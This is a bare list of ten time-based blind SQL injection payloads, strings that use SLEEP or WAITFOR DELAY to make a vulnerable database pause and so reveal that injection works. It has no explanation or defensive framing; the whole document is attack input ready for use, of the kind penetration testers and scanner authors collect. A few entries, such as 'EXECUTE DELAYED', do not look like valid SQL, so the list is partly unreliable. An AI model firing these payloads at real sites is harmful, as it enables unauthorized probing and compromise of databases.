#blind sql injection payload
  1.	' OR SLEEP(5) --
	2.	' OR 1=1 AND SLEEP(5) --
	3.	' OR 1=1; SELECT SLEEP(5) --
	4.	'; EXECUTE DELAYED 'SELECT SLEEP(5)' --
	5.	'; SELECT CASE WHEN (1=1) THEN SLEEP(5) ELSE 0 END --
	6.	'; IF(1=1, SLEEP(5), 0) --
	7.	'; IF(1=1, (SELECT SLEEP(5)), 0) --
	8.	' OR SLEEP(5) AND 'QDeC'='QDeC
	9.	'; WAITFOR DELAY '0:0:5' --
	10.	' OR SLEEP(5) AND ''='
